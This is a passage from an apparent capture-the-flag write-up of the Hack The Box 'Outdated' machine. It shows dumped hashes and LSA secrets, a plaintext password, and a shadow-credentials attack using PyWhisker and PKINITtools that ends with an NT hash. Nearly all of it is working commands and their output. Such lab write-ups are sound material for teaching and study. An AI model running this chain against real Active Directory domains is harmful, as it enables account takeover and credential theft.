DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cadef52f10f56e21d9f4934c4d5bf813:::
[*] Dumping cached domain logon information (domain/username:hash)
OUTDATED.HTB/btables:$DCC2$10240#btables#91e9188a93c8b59479cbe490e22fc790
OUTDATED.HTB/Administrator:$DCC2$10240#Administrator#fcf452603a2e8ee8f65158c73469cf7e
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:f80410e1c92e55a7b058b888deeea7ed6ef3d062adf879d2abea86cc1c9974379269f6f444d300aadd4882920353b5df37ddab7d9e8376019d5722a5cd48005550870d1c9d8874ced04570a3708bbcda4989dcba159fdde308481d37ef68c8831221caf06cf57e9b1b504f7a7e9a2bbe6b9ff88046763e7b9b1e1ed949dbc9a1abeba6be717a68225f8893d0e8fbe7aebc9e57d34b9f4b040d6a1213762ae93a07157e76054e1ebc9dfc74c59fd89e18c789985cadf5e97e42ac8b3c64bef8681fdb387c801044ccdeea39f4f034419ee68259554060d9687393a0f4af9f98e88999e55c24f79cb92b5f96c1babfbb3c
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c57f6ab8490903d04597f6ff606fc58b
[*] DefaultPassword 
(Unknown User):5myBPLPDKT3Bfq
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x76a645f1d5e5879a07eb92ccc767cbe8bf5d8219
dpapi_userkey:0x8225e352fcf823af35757bacff4cdfe98c73db8f
[*] NL$KM 
 0000   08 4C 51 0B 9B 09 ED C8  4D 12 A0 47 40 5B 64 2D   .LQ.....M..G@[d-
 0010   32 3C AC B5 E2 42 0E 41  76 99 DE D7 20 E6 15 B9   2<...B.Av... ...
 0020   79 57 B8 29 D2 5D 44 91  3F D5 84 76 BE 00 D2 00   yW.).]D.?..v....
 0030   16 8B 85 3D 3F 17 27 1F  16 4F C0 37 64 6E 44 E5   ...=?.'..O.7dnD.
NL$KM:084c510b9b09edc84d12a047405b642d323cacb5e2420e417699ded720e615b97957b829d25d44913fd58476be00d200168b853d3f17271f164fc037646e44e5
[*] Cleaning up...

```

This also includes a plaintext “DefaultPassword” for an unknown user of “5myBPLPDKT3Bfq”. That suggests it’s probably a domain user, and not a local user.

`crackmapexec` shows these creds are good for btables:

```

oxdf@hacky$ crackmapexec smb 10.10.11.175 -u btables -p 5myBPLPDKT3Bfq
SMB         10.10.11.175    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [+] outdated.htb\btables:5myBPLPDKT3Bfq

```

### Remote Shadow Credentials

#### PyWhisker

With creds, I can try to remotely run PyWhisker. It fails:

```

oxdf@hacky$ python /opt/pywhisker/pywhisker.py --action list -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t 10.10.11.175
[!] automatic bind not successful - strongerAuthRequired

```

This shows that the LDAP bind failed, TLS is required. Adding `--use-ldaps` fixes it:

```

oxdf@hacky$ python /opt/pywhisker/pywhisker.py --action list -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t sflowers --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute

```

sflowers has no shadow credentials. I’ll add one:

```

oxdf@hacky$ python /opt/pywhisker/pywhisker.py --action add -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t sflowers --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: fddf766d-4eb3-193f-169f-42afc68ae6da
[*] Updating the msDS-KeyCredentialLink attribute of sflowers
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: alTWylpv.pfx
[*] Must be used with password: CpgwxPvDtXvsf4wNjjgN
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

#### PKINITtools

The PyWhisker output suggests using [PKINITtools](https://github.com/dirkjanm/PKINITtools) to get a TGT. I’ll do that:

```

oxdf@hacky$ python /opt/PKINITtools/gettgtpkinit.py -cert-pfx alTWylpv.pfx -pfx-pass CpgwxPvDtXvsf4wNjjgN outdated.htb/sflowers sflowers.ccache -dc-ip 10.10.11.175
2022-08-03 23:09:10,618 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-08-03 23:09:10,630 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-08-03 23:09:10,826 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-08-03 23:09:10,826 minikerberos INFO     91229b2482fcba24d91bd4a57e5d04cd403eba67c60a83d70ff39a72ee571f8f
INFO:minikerberos:91229b2482fcba24d91bd4a57e5d04cd403eba67c60a83d70ff39a72ee571f8f
2022-08-03 23:09:10,831 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

I did have some errors with time skew, but I am able to fix that by disabling the VirtualBox service that manages the time in my VM (`sudo service vboxadd-service stop`) and then running `sudo rdate -n 10.10.11.175`.

For the next step, I’ll need to run the `getnthash.py` script. I had some issues on my system getting the Python dependencies to run, so I just created a virtual environment (`python -m venv venv`, and then `source venv/bin/activate`) and installed the requirements again in there (`pip install -r requirements.txt`). Then it worked:

```

(venv) oxdf@hacky$ export KRB5CCNAME=sflowers.ccache 
(venv) oxdf@hacky$ python /opt/PKINITtools/getnthash.py outdated.htb/sflowers -key 91229b2482fcba24d91bd4a57e5d04cd403eba67c60a83d70ff39a72ee571f8f
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
1fcdb1f6015dcb318cc77bb2bda14db5

```

With that hash, I can get an Evil-WinRM session just like [above](#winrm).